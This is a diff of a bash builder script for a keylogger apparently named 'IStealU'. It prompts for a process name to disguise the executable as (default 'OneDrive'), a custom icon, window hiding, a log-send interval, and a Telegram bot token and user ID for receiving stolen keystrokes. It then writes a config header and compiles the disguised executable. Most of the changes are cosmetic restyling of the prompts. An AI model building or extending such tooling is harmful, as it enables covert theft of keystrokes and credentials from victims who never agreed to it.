@@ -2,17 +2,19 @@
 
 max_key_len=20
 
+# Цветовая схема в стиле Metasploit
 purple='\033[0;35m'
 reset='\033[0m'
 green='\033[0;32m'
 yellow='\033[1;33m'
 red='\033[0;31m'
 cyan='\033[0;36m'
+blue='\033[0;34m'
 
 print_row() {
     local key=$1
     local value=$2
-    printf "${purple}║ %-*s : %-*s ${reset}\n" $max_key_len "$key" 30 "$value"
+    printf "${purple}│ ${cyan}%-*s ${reset}: ${green}%-*s${reset}\n" $max_key_len "$key" 30 "$value"
 }
 
 spacer() {
@@ -33,6 +35,12 @@ logo() {
     echo -e " ▒ ░   ░  ░  ░    ░         ░    ░   ▒     ░ ░       ░░░ ░ ░  "
     echo -e " ░           ░              ░  ░     ░  ░    ░  ░      ░      "
     echo -e "${reset}"
+    echo -e "${green}                     CREATED BY Nighty3098"
+    echo -e "${reset}"
+}
+
+builder_prompt() {
+    printf "${blue}[$(whoami)${reset}@${purple}IStealU${blue}]${reset} > "
 }
 
 ask_yes_no() {
@@ -41,20 +49,16 @@ ask_yes_no() {
     local answer
 
     while true; do
-        if [ "$default" == "y" ]; then
-            read -rp "$prompt [Y/n]: " answer
-            answer=${answer:-y}
-        elif [ "$default" == "n" ]; then
-            read -rp "$prompt [y/N]: " answer
-            answer=${answer:-n}
-        else
-            read -rp "$prompt [y/n]: " answer
-        fi
+        echo -e "${yellow}[*] $prompt${reset}" >&2
+        builder_prompt >&2
+        read -r answer
 
-        case "$answer" in
-            [Yy]*) echo "true"; return ;;
-            [Nn]*) echo "false"; return ;;
-            *) echo -e "${red}Please enter y or n.${reset}" >&2 ;;
+        [ -z "$answer" ] && answer="$default"
+        
+        case "$(echo "$answer" | tr '[:upper:]' '[:lower:]')" in
+            y|yes) echo "true"; return ;;
+            n|no)  echo "false"; return ;;
+            *)     echo -e "${red}[-] Invalid choice, please enter y or n${reset}" >&2 ;;
         esac
     done
 }
@@ -64,29 +68,31 @@ ask_input() {
     local default="$2"
     local input
 
-    if [ -n "$default" ]; then
-        read -rp "$prompt [$default]: " input
-        input=${input:-$default}
-    else
-        read -rp "$prompt: " input
+    echo -e "${yellow}[*] $prompt${reset}" >&2
+    builder_prompt >&2
+    
+    read -r input
+    
+    if [ -n "$default" ] && [ -z "$input" ]; then
+        input="$default"
     fi
-    echo "$input"
+    
+    echo -n "$input"
 }
 
 logo
 
+echo -e "${green}[+] For realism, edit version.rs the file. OneDrive is used by default.${reset}"
+echo -e "${cyan}[!] Let's configure your keylogger build! Please enter the required information.${reset}"
+
 spacer
-
-echo -e "${green}For realism, edit version.rs the file. OneDrive is used by default.${reset}"
-
-echo -e "${cyan}Let's configure your keylogger build! Please enter the required information.${reset}"
 
 while true; do
     process_name=$(ask_input "Enter the process name for masquerading (default: OneDrive)" "OneDrive")
     if [[ "$process_name" =~ ^[a-zA-Z0-9._-]+$ ]]; then
         break
     else
-        echo -e "${red}Invalid process name. Use only letters, numbers, dot, underscore, dash.${reset}"
+        echo -e "${red}[-] Invalid process name. Use only letters, numbers, dot, underscore, dash.${reset}" >&2
     fi
 done
 
@@ -95,65 +101,59 @@ while true; do
     if [ -z "$path_to_ico" ] || [ -f "$path_to_ico" ]; then
         break
     else
-        echo -e "${red}File not found at path: $path_to_ico${reset}"
+        echo -e "${red}[-] File not found: $path_to_ico${reset}" >&2
     fi
 done
 
-log_to_file=$(ask_yes_no "Save data to file?" "y")
-
-hide_window=$(ask_yes_no "Hide debug window?" "n")
+log_to_file=$(ask_yes_no "Save data to file? (Y/n)" "y")
+hide_window=$(ask_yes_no "Hide debug window? (y/N)" "n")
 
 while true; do
     wait_time=$(ask_input "Enter the time interval in minutes after which the log will be sent (min 1)" "5")
     if [[ "$wait_time" =~ ^[0-9]+$ ]] && [ "$wait_time" -ge 1 ]; then
         break
     else
-        echo -e "${red}Please enter a valid positive integer (1 or higher).${reset}"
+        echo -e "${red}[-] Please enter a valid positive integer (1 or higher).${reset}" >&2
     fi
 done
 
 bot_token=""
 while [ -z "$bot_token" ]; do
-    bot_token=$(ask_input "Enter the Telegram bot token (Use a bot you don't mind losing)")
+    bot_token=$(ask_input "Enter the Telegram bot token (Use a bot you don't mind losing)" "")
     if [ -z "$bot_token" ]; then
-        echo -e "${red}Bot token can't be empty.${reset}"
+        echo -e "${red}[-] Bot token can't be empty.${reset}" >&2
     fi
 done
 
 tg_user_id=""
 while ! [[ "$tg_user_id" =~ ^[0-9]+$ ]]; do
-    tg_user_id=$(ask_input "Enter your Telegram user ID (numeric)")
+    tg_user_id=$(ask_input "Enter your Telegram user ID (numeric)" "")
     if ! [[ "$tg_user_id" =~ ^[0-9]+$ ]]; then
-        echo -e "${red}User ID must be a numeric value.${reset}"
+        echo -e "${red}[-] User ID must be a numeric value.${reset}" >&2
     fi
 done
 
 spacer
-
-echo -e "${purple}╔═════════════════════════════════════════════════════════════════"
-echo -e "${purple}║                          Your options                          "
-echo -e "${purple}╠═════════════════════════════════════════════════════════════════"
+echo -e "${purple}┌─────────────────────── ${cyan}CONFIGURATION SUMMARY ${purple}───────────────────────┐"
 print_row "Process name" "$process_name"
 print_row "Log to file" "$log_to_file"
-print_row "Show debug window" "$hide_window"
-print_row "Log to console" "$log_to_console"
+print_row "Hide window" "$hide_window"
 print_row "Wait time (minutes)" "$wait_time"
-print_row "Bot token (hidden)" "************"
+print_row "Bot token" "***************"
 print_row "User ID" "$tg_user_id"
-echo -e "${purple}╚═════════════════════════════════════════════════════════════════${reset}"
+echo -e "${purple}└─────────────────────────────────────────────────────────────────────┘${reset}"
 
 spacer
 
-confirm_build=$(ask_yes_no "Start build?" "y")
-if [ "$confirm_build" != "true" ]; then
-    echo -e "${yellow}Build cancelled by user.${reset}"
+confirm_build=$(ask_yes_no "Start build? (Y/n)" "y")
+if [ "$confirm_build" = "false" ]; then
+    echo -e "${yellow}[-] Build cancelled by user.${reset}"
     exit 0
 fi
 
 logo
 spacer
-
-echo -e "${cyan}Generating configuration...${reset}"
+echo -e "${cyan}[*] Generating configuration...${reset}"
 
 {
     echo "#pragma once"
@@ -164,33 +164,32 @@ echo -e "${cyan}Generating configuration...${reset}"
     echo "const int            waitTime      = $wait_time;"
     echo "const std::wstring   botToken      = L\"$bot_token\";"
     echo "const std::wstring   userID        = L\"$tg_user_id\";"
-} > src/config.h || { echo -e "${red}Error writing config.h${reset}"; exit 1; }
+} > src/config.h || { echo -e "${red}[-] Error writing config.h${reset}" >&2; exit 1; }
 
 if [ -z "$path_to_ico" ]; then
     if [ -f src/resources/icon_d.ico ]; then
         cp -f src/resources/icon_d.ico src/resources/icon.ico
-        echo -e "${green}Using default icon (icon_d.ico copied to icon.ico).${reset}"
+        echo -e "${green}[+] Using default icon${reset}"
     else
-        echo -e "${red}Default icon src/resources/icon_d.ico not found!${reset}"
+        echo -e "${red}[-] Default icon not found!${reset}" >&2
         exit 1
     fi
 else
     cp -f "$path_to_ico" src/resources/icon.ico
-    echo -e "${green}Icon $path_to_ico copied to src/resources/icon.ico.${reset}"
+    echo -e "${green}[+] Custom icon installed${reset}"
 fi
 
-cd src || { echo -e "${red}Failed to enter src directory.${reset}"; exit 1; }
+cd src || { echo -e "${red}[-] Failed to enter src directory${reset}" >&2; exit 1; }
 
-echo -e "${cyan}Cleaning previous build artifacts...${reset}"
+echo -e "${cyan}[*] Cleaning previous build artifacts...${reset}"
 make clean
 
-echo -e "${cyan}Starting build of keylogger executable ${process_name}.exe ...${reset}"
-if make TARGET=${process_name}.exe; then
-    echo -e "${green}Build completed successfully.${reset}"
+echo -e "${cyan}[*] Building keylogger executable: ${process_name}.exe${reset}"
+if make TARGET="${process_name}.exe"; then
+    echo -e "${green}[+] Build completed successfully${reset}"
     rm -f config.h
-
-    clear
-
+    spacer
+    
     echo -e "${green}"
     echo "  ______                                     __             __               "
     echo " /      \\                                   |  \\           |  \\              "
@@ -205,17 +204,15 @@ if make TARGET=${process_name}.exe; then
     echo "                                  | 88                                       "
     echo "                                   \\88                                       "
     echo -e "${reset}"
-
     spacer
-
+    
     if [ -f "${process_name}.exe" ]; then
-        echo -e "${green}YOUR KEYLOGGER: ${reset}"
-        echo -e "${purple}$(realpath ${process_name}.exe)${reset}"
+        echo -e "${cyan}[*] Your keylogger:${reset}"
+        echo -e "    ${green}$(pwd)/${process_name}.exe${reset}"
     else
-        echo -e "${red}File '${process_name}.exe' was not found after build!${reset}"
+        echo -e "${red}[-] Executable not found after build!${reset}" >&2
     fi
 else
-    echo -e "${red}Build failed. See errors below:${reset}"
-    make TARGET=${process_name}.exe 2>&1 | tee /dev/stderr
+    echo -e "${red}[-] Build failed${reset}" >&2
     exit 1
 fi
